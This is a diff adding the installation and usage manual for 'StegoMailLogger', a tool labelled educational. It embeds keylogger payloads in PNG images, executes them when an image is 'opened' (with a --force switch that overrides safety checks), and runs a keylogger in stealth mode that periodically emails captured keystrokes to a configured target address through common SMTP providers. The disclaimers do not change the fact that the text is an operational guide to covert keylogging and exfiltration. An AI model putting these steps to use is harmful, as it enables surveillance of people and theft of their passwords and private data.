@@ -1,0 +1,550 @@
+================================================================================
+                    STEGOMAILLOGGER - INSTALLATION & USAGE INSTRUCTIONS
+================================================================================
+
+🔒 EDUCATIONAL PURPOSE ONLY - CONTROLLED ENVIRONMENT USE
+⚠️  THIS SOFTWARE IS FOR CYBERSECURITY LEARNING ONLY
+📚 NOT FOR MALICIOUS USE OR PRODUCTION DEPLOYMENT
+
+================================================================================
+                                QUICK START GUIDE
+================================================================================
+
+1. CLONE/DOWNLOAD PROJECT
+2. INSTALL DEPENDENCIES  
+3. CREATE SAMPLE FILES
+4. TEST ENCODING/DECODING
+5. CONFIGURE EMAIL (OPTIONAL)
+
+================================================================================
+                             DETAILED INSTALLATION
+================================================================================
+
+STEP 1: SYSTEM REQUIREMENTS
+----------------------------
+- Python 3.8 or higher
+- pip package manager
+- Virtual environment (recommended)
+- 500MB disk space
+- Internet connection for dependencies
+
+STEP 2: PROJECT SETUP
+---------------------
+# Navigate to project directory
+cd stegomail_logger
+
+# Create virtual environment (RECOMMENDED)
+python3 -m venv venv
+
+# Activate virtual environment
+# On Linux/Mac:
+source venv/bin/activate
+# On Windows:
+venv\Scripts\activate
+
+# Install dependencies
+pip install -r requirements.txt
+
+# Alternative: Install without virtual environment (not recommended)
+pip3 install --break-system-packages -r requirements.txt
+
+STEP 3: VERIFY INSTALLATION
+---------------------------
+# Test CLI interface
+python3 main.py --help
+
+# Should display banner and help menu
+# If you see import errors, install missing dependencies:
+pip install Pillow cryptography python-dotenv pynput
+
+================================================================================
+                                BASIC USAGE
+================================================================================
+
+STEP 1: CREATE SAMPLE FILES
+---------------------------
+python3 main.py samples
+
+# Creates:
+# - sample_keylogger.py (basic payload)
+# - enhanced_keylogger.py (advanced payload)  
+# - sample_cover.png (cover image)
+
+STEP 2: ENCODE PAYLOAD INTO IMAGE
+---------------------------------
+python3 main.py encode --payload sample_keylogger.py --image sample_cover.png --output stego_image.png
+
+# This embeds the keylogger into the image using LSB steganography
+# Creates: stego_image.png (contains hidden payload)
+
+STEP 3: DECODE PAYLOAD FROM IMAGE
+---------------------------------
+python3 main.py decode --image stego_image.png --output extracted_payload.py
+
+# This extracts and decrypts the hidden payload
+# Creates: extracted_payload.py (should match original)
+
+STEP 4: SIMULATE IMAGE OPENING (EDUCATIONAL)
+--------------------------------------------
+python3 main.py open --image stego_image.png --no-display --force
+
+# Simulates opening image and executing payload
+# --no-display: Don't show image
+# --force: Override safety checks (educational use only)
+
+================================================================================
+                              EMAIL CONFIGURATION
+================================================================================
+
+OPTION A: USING CONFIG.JSON
+---------------------------
+# Edit config.json file
+nano config.json
+
+# Update email settings:
+{
+    "email": {
+        "smtp_server": "smtp.gmail.com",
+        "smtp_port": 587,
+        "username": "your_email@gmail.com",
+        "password": "your_app_password",
+        "target_email": "target@example.com",
+        "subject": "Educational Log Report"
+    }
+}
+
+OPTION B: USING ENVIRONMENT VARIABLES
+-------------------------------------
+# Copy example file
+cp .env.example .env
+
+# Edit .env file
+nano .env
+
+# Set credentials:
+SMTP_SERVER=smtp.gmail.com
+SMTP_PORT=587
+EMAIL_USERNAME=your_email@gmail.com
+EMAIL_PASSWORD=your_app_password
+TARGET_EMAIL=target@example.com
+
+EMAIL PROVIDER SETUP:
+---------------------
+
+GMAIL:
+1. Enable 2-Factor Authentication
+2. Generate App Password: https://myaccount.google.com/apppasswords
+3. Use app password (not regular password)
+
+SMTP2GO:
+1. Create account: https://www.smtp2go.com/
+2. Get SMTP credentials from dashboard
+3. Server: mail.smtp2go.com:587
+
+MAILGUN:
+1. Create account: https://www.mailgun.com/
+2. Set up sandbox domain
+3. Server: smtp.mailgun.org:587
+
+MAILJET:
+1. Create account: https://www.mailjet.com/
+2. Get API credentials
+3. Server: in-v3.mailjet.com:587
+
+TEST EMAIL CONFIGURATION:
+-------------------------
+python3 main.py email-test
+
+================================================================================
+                              ADVANCED USAGE
+================================================================================
+
+KEYLOGGER TESTING:
+-----------------
+python3 main.py keylogger --duration 30
+
+# Runs educational keylogger for 30 seconds
+# Type text to test keystroke capture
+# Press ESC to stop early (non-stealth mode)
+
+CUSTOM PAYLOAD ENCODING:
+-----------------------
+# Create your own payload file
+echo 'print("Hello from custom payload!")' > custom_payload.py
+
+# Encode custom payload
+python3 main.py encode --payload custom_payload.py --image sample_cover.png --output custom_stego.png
+
+BATCH OPERATIONS:
+----------------
+# Create multiple payloads
+for i in {1..3}; do
+    echo "print('Payload $i executed')" > payload_$i.py
+    python3 main.py encode --payload payload_$i.py --image sample_cover.png --output stego_$i.png
+done
+
+STEALTH CONFIGURATION:
+---------------------
+# Edit config.json for stealth settings
+{
+    "keylogger": {
+        "send_interval": 300,
+        "stealth_mode": true,
+        "max_log_size": 1024
+    }
+}
+
+================================================================================
+                               DOCKER DEPLOYMENT
+================================================================================
+
+OPTION 1: BUILD AND RUN
+-----------------------
+# Build container
+docker build -t stegomail-logger .
+
+# Run with samples
+docker run --rm -it stegomail-logger python main.py samples
+
+# Interactive shell
+docker run --rm -it stegomail-logger bash
+
+OPTION 2: DOCKER COMPOSE (RECOMMENDED)
+--------------------------------------
+# Create docker-compose.yml
+cat > docker-compose.yml << EOF
+version: '3.8'
+services:
+  stegomail:
+    build: .
+    volumes:
+      - ./data:/app/data
+    environment:
+      - PYTHONUNBUFFERED=1
+    command: python main.py --help
+EOF
+
+# Run with docker-compose
+docker-compose up
+
+================================================================================
+                              TROUBLESHOOTING
+================================================================================
+
+COMMON ISSUES AND SOLUTIONS:
+
+1. IMPORT ERRORS
+---------------
+Error: ModuleNotFoundError: No module named 'PIL'
+Solution: pip install Pillow
+
+Error: ModuleNotFoundError: No module named 'pynput'
+Solution: pip install pynput
+
+Error: ModuleNotFoundError: No module named 'cryptography'
+Solution: pip install cryptography
+
+2. PERMISSION ERRORS
+-------------------
+Error: Permission denied
+Solution: 
+- Use virtual environment
+- Check file permissions: chmod +x main.py
+- Use sudo if necessary (not recommended)
+
+3. EMAIL AUTHENTICATION FAILS
+-----------------------------
+Error: SMTP authentication failed
+Solution:
+- Check credentials in config.json or .env
+- Use App Password for Gmail (not regular password)
+- Enable "Less secure app access" (not recommended)
+- Verify SMTP server and port settings
+
+4. PAYLOAD EXTRACTION FAILS
+---------------------------
+Error: No valid payload found
+Solution:
+- Verify image was encoded properly
+- Check encryption settings match
+- Ensure image file is not corrupted
+
+5. ENVIRONMENT SAFETY BLOCKS EXECUTION
+--------------------------------------
+Error: Environment safety check failed
+Solution:
+- Use --force flag for educational override
+- Run in VM or educational environment
+- Check hostname contains educational indicators
+
+6. KEYLOGGER NOT CAPTURING
+--------------------------
+Error: No keystrokes captured
+Solution:
+- Run with sudo on Linux (for device access)
+- Check if running in GUI environment
+- Verify pynput installation
+
+================================================================================
+                                 USAGE EXAMPLES
+================================================================================
+
+BASIC WORKFLOW:
+--------------
+# 1. Create samples
+python3 main.py samples
+
+# 2. Encode payload
+python3 main.py encode --payload sample_keylogger.py --image sample_cover.png --output demo.png
+
+# 3. Analyze image
+python3 main.py decode --image demo.png
+
+# 4. Simulate execution
+python3 main.py open --image demo.png --no-display --force
+
+TESTING EMAIL FUNCTIONALITY:
+----------------------------
+# 1. Configure email in config.json
+# 2. Test configuration
+python3 main.py email-test
+
+# 3. Run keylogger with email
+python3 main.py keylogger --duration 10
+
+CREATING CUSTOM SCENARIOS:
+-------------------------
+# Educational malware simulation
+echo 'import os; print(f"System: {os.name}")' > system_enum.py
+python3 main.py encode --payload system_enum.py --image sample_cover.png --output malware_sim.png
+
+# Social engineering simulation  
+echo 'print("Please enter your password:")' > phishing_sim.py
+python3 main.py encode --payload phishing_sim.py --image sample_cover.png --output phishing.png
+
+FORENSIC ANALYSIS PRACTICE:
+--------------------------
+# 1. Create evidence
+python3 main.py encode --payload enhanced_keylogger.py --image sample_cover.png --output evidence.png
+
+# 2. Analyze evidence
+python3 main.py decode --image evidence.png --output forensic_extract.py
+
+# 3. Examine extracted payload
+cat forensic_extract.py
+
+================================================================================
+                               SAFETY GUIDELINES
+================================================================================
+
+BEFORE USING THIS SOFTWARE:
+---------------------------
+✅ Obtain written permission from educational institution
+✅ Use only in controlled lab environments
+✅ Run in virtual machines for isolation
+✅ Document all activities for educational purposes
+✅ Follow institutional cybersecurity policies
+
+DO NOT:
+------
+❌ Use on production systems
+❌ Monitor individuals without consent
+❌ Deploy for malicious purposes
+❌ Violate privacy or data protection laws
+❌ Use without proper authorization
+
+EDUCATIONAL USE CASES:
+---------------------
+✅ Cybersecurity training and awareness
+✅ Incident response exercises
+✅ Forensic analysis practice
+✅ Steganography detection development
+✅ Academic research (with approval)
+
+================================================================================
+                                PROJECT STRUCTURE
+================================================================================
+
+stegomail_logger/
+├── steg/
+│   ├── __init__.py           # Module initialization
+│   ├── encoder.py            # LSB steganography encoding
+│   └── decoder.py            # LSB steganography decoding
+├── logger/
+│   ├── __init__.py           # Module initialization  
+│   ├── keylogger.py          # Educational keylogger
+│   └── mailer.py             # Multi-provider SMTP
+├── trigger/
+│   ├── __init__.py           # Module initialization
+│   └── opener.py             # Image opening simulation
+├── utils/
+│   ├── __init__.py           # Module initialization
+│   └── encryptor.py          # XOR/AES encryption
+├── main.py                   # CLI interface (626 lines)
+├── config.json               # Configuration file
+├── requirements.txt          # Python dependencies
+├── .env.example              # Environment variables template
+├── Dockerfile                # Container deployment
+├── README.md                 # Comprehensive documentation (503 lines)
+├── PROJECT_SUMMARY.md        # Implementation summary
+└── INSTRUCTIONS.txt          # This file
+
+================================================================================
+                                 CLI COMMANDS
+================================================================================
+
+MAIN COMMANDS:
+-------------
+python3 main.py samples                    # Create sample files
+python3 main.py encode                     # Embed payload in image  
+python3 main.py decode                     # Extract payload from image
+python3 main.py open                       # Simulate image opening
+python3 main.py keylogger                  # Run keylogger test
+python3 main.py email-test                 # Test email configuration
+
+ENCODE OPTIONS:
+--------------
+--payload PAYLOAD     Path to payload file (required)
+--image IMAGE         Path to cover image (required)
+--output OUTPUT       Path for output stego image (required)
+
+DECODE OPTIONS:
+--------------
+--image IMAGE         Path to steganographic image (required)
+--output OUTPUT       Path to save extracted payload (optional)
+--quiet              Suppress payload preview
+
+OPEN OPTIONS:
+------------
+--image IMAGE         Path to steganographic image (required)
+--no-display         Don't display image
+--no-execute          Don't execute payload
+--force              Override safety checks
+
+KEYLOGGER OPTIONS:
+-----------------
+--duration DURATION   Duration in seconds (default: 30)
+
+================================================================================
+                              CONFIGURATION REFERENCE
+================================================================================
+
+CONFIG.JSON STRUCTURE:
+---------------------
+{
+    "email": {
+        "smtp_server": "smtp.gmail.com",
+        "smtp_port": 587,
+        "username": "your_email@gmail.com", 
+        "password": "your_app_password",
+        "target_email": "target@example.com",
+        "subject": "Educational Log Report"
+    },
+    "encryption": {
+        "method": "xor",                    # "xor" or "aes"
+        "key": "your_encryption_key",
+        "aes_enabled": false
+    },
+    "steganography": {
+        "embed_method": "lsb",              # LSB technique
+        "channels": ["red", "green", "blue"],
+        "bit_depth": 1
+    },
+    "keylogger": {
+        "log_file": "keylog.txt",
+        "send_interval": 300,               # 5 minutes
+        "stealth_mode": true,
+        "max_log_size": 1024
+    }
+}
+
+ENVIRONMENT VARIABLES:
+---------------------
+SMTP_SERVER=smtp.gmail.com
+SMTP_PORT=587
+EMAIL_USERNAME=your_email@gmail.com
+EMAIL_PASSWORD=your_app_password
+TARGET_EMAIL=target@example.com
+ENCRYPTION_KEY=your_secret_key
+
+================================================================================
+                                LEARNING OBJECTIVES
+================================================================================
+
+AFTER COMPLETING THIS PROJECT, STUDENTS WILL:
+---------------------------------------------
+✅ Understand steganographic techniques and LSB embedding
+✅ Learn payload deployment and execution methods
+✅ Practice email-based data exfiltration simulation
+✅ Develop encryption and decryption skills
+✅ Gain experience with environment detection
+✅ Build defensive tools and detection algorithms
+✅ Practice incident response and forensic analysis
+✅ Understand ethical boundaries in cybersecurity
+
+NEXT STEPS FOR ADVANCED LEARNING:
+---------------------------------
+1. Build steganography detection tools
+2. Develop network monitoring for email patterns
+3. Create behavioral analysis algorithms
+4. Practice red team/blue team exercises
+5. Research advanced evasion techniques
+6. Study real-world malware samples (safely)
+
+================================================================================
+                                   SUPPORT
+================================================================================
+
+FOR EDUCATIONAL SUPPORT:
+-----------------------
+- Review comprehensive README.md
+- Check PROJECT_SUMMARY.md for implementation details
+- Examine source code comments for technical explanations
+- Test individual modules for understanding
+
+FOR TECHNICAL ISSUES:
+--------------------
+- Verify Python version (3.8+)
+- Check all dependencies installed
+- Ensure proper file permissions
+- Run in virtual environment
+- Test with sample files first
+
+FOR ADVANCED FEATURES:
+---------------------
+- Study encryption implementation in utils/encryptor.py
+- Examine steganography algorithms in steg/ modules
+- Analyze email protocols in logger/mailer.py
+- Review safety mechanisms in trigger/opener.py
+
+================================================================================
+                               PROJECT COMPLETION
+================================================================================
+
+✅ INSTALLATION COMPLETE WHEN:
+- All dependencies installed without errors
+- python3 main.py --help displays banner
+- python3 main.py samples creates test files
+- Basic encode/decode cycle works
+
+✅ CONFIGURATION COMPLETE WHEN:
+- Email settings configured (optional)
+- Encryption preferences set
+- Safety guidelines reviewed
+- Educational environment confirmed
+
+✅ READY FOR EDUCATIONAL USE WHEN:
+- All safety mechanisms understood
+- Ethical guidelines acknowledged  
+- Proper permissions obtained
+- Controlled environment established
+
+================================================================================
+
+🎓 EDUCATIONAL CYBERSECURITY PROJECT - USE RESPONSIBLY! 🛡️
+
+Created for learning, built for safety, designed for defense.
+
+StegoMailLogger v1.0 - Educational Steganography Learning Platform
+
+================================================================================
